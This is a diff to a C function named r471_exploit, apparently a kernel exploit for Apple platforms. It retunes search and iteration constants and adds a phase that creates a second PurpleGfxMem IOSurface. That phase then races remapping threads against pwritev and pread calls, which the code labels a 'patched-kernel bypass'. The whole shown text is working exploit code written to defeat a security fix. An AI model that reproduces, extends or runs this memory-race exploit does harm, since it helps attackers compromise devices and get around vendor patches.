@@ -17743,8 +17743,8 @@ static void r471_exploit(void) {
     #define R471_PAGE_SZ 16384
     #define R471_SURF_PAGES 8
     #define R471_SURF_SZ (R471_SURF_PAGES * R471_PAGE_SZ)
-    #define R471_SEARCH_SZ (32ULL * 1024 * 1024)
-    #define R471_ITERS_PER_PAGE 50
+    #define R471_SEARCH_SZ (16ULL * 1024 * 1024)
+    #define R471_ITERS_PER_PAGE 100
 
     pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
 
@@ -17948,8 +17948,71 @@ static void r471_exploit(void) {
         free(ffbuf2);
     }
 
-    /* Phase 4: Search mapping (32 MiB) */
-    rlog("\n  --- Phase 4: Search mapping (32 MiB) ---\n"); fflush(stdout);
+    /* Phase 3b: Second IOSurface (PHYS_CONTIG) for patched-kernel bypass */
+    rlog("\n  --- Phase 3b: Second PurpleGfxMem IOSurface ---\n"); fflush(stdout);
+    CFMutableDictionaryRef props2 = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceWidth"), CFNumberCreate(NULL, kCFNumberIntType, &pw));
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceHeight"), CFNumberCreate(NULL, kCFNumberIntType, &ph));
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceBytesPerElement"), CFNumberCreate(NULL, kCFNumberIntType, &pbpe));
+    CFDictionarySetValue(props2, CFSTR("IOSurfacePixelFormat"), CFNumberCreate(NULL, kCFNumberIntType, &ppf));
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceAllocSize"), CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz_v));
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
+    IOSurfaceRef surf2 = IOSurfaceCreate(props2);
+    CFRelease(props2);
+    mach_port_t entry_surf2 = MACH_PORT_NULL;
+    if (surf2) {
+        IOSurfaceLock(surf2, 0, NULL);
+        void *surf2_base = IOSurfaceGetBaseAddress(surf2);
+        memset(surf2_base, 0xCC, R471_SURF_SZ);
+        memory_object_size_t surf2_memsz = R471_SURF_SZ;
+        mach_make_memory_entry_64(mach_task_self(), &surf2_memsz,
+            (mach_vm_address_t)(uintptr_t)surf2_base,
+            VM_PROT_READ | VM_PROT_WRITE, &entry_surf2, MACH_PORT_NULL);
+        IOSurfaceUnlock(surf2, 0, NULL);
+        rlog("    surf2 base=%p entry=0x%x\n", surf2_base, entry_surf2);
+
+        /* Quick race: surf1 vs surf2 (both PHYS_CONTIG) */
+        rlog("    Quick race: surf1 vs surf2 (500 iters, 128K)...\n"); fflush(stdout);
+        struct r471_shared q2ctx;
+        memset(&q2ctx, 0, sizeof(q2ctx));
+        q2ctx.target = (mach_vm_address_t)(uintptr_t)surf_base;
+        q2ctx.target_size = R471_SURF_SZ;
+        q2ctx.surf_entry = entry_mme;
+        q2ctx.search_entry = entry_surf2;
+        pthread_t q2t1, q2t2;
+        pthread_create(&q2t1, NULL, r471_osc_thread, &q2ctx);
+        pthread_create(&q2t2, NULL, r471_osc_thread, &q2ctx);
+        q2ctx.go = 1; __sync_synchronize();
+        int q2s1 = 0, q2s2 = 0, q2einval = 0, q2other = 0;
+        for (int qi = 0; qi < 500; qi++) {
+            struct iovec qiov = {
+                (void *)((uintptr_t)surf_base + 0x3F00), 0x10100
+            };
+            errno = 0;
+            ssize_t qw = pwritev(fd, &qiov, 1, 0x3F00);
+            if (qw == -1 && errno == EINVAL) q2einval++;
+            else if (qw > 0) {
+                uint8_t qchk;
+                pread(fd, &qchk, 1, 0x3F00);
+                if (qchk == 0xAA) q2s1++;
+                else if (qchk == 0xCC) q2s2++;
+                else q2other++;
+            } else q2other++;
+        }
+        q2ctx.stop = 1; __sync_synchronize();
+        pthread_join(q2t1, NULL); pthread_join(q2t2, NULL);
+        rlog("    surf1_vs_surf2: s1=%d s2=%d einval=%d other=%d osc=%d\n",
+             q2s1, q2s2, q2einval, q2other, q2ctx.remap_count);
+        memset(surf_base, 0xAA, R471_SURF_SZ);
+    } else {
+        rlog("    surf2 create FAILED\n");
+    }
+
+    /* Phase 4: Search mapping */
+    rlog("\n  --- Phase 4: Search mapping (%llu MiB) ---\n",
+         (unsigned long long)(R471_SEARCH_SZ / (1024*1024)));
+    fflush(stdout);
     uint64_t search_pages = R471_SEARCH_SZ / R471_PAGE_SZ;
     mach_vm_address_t search_base = 0;
     kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_base, R471_SEARCH_SZ,
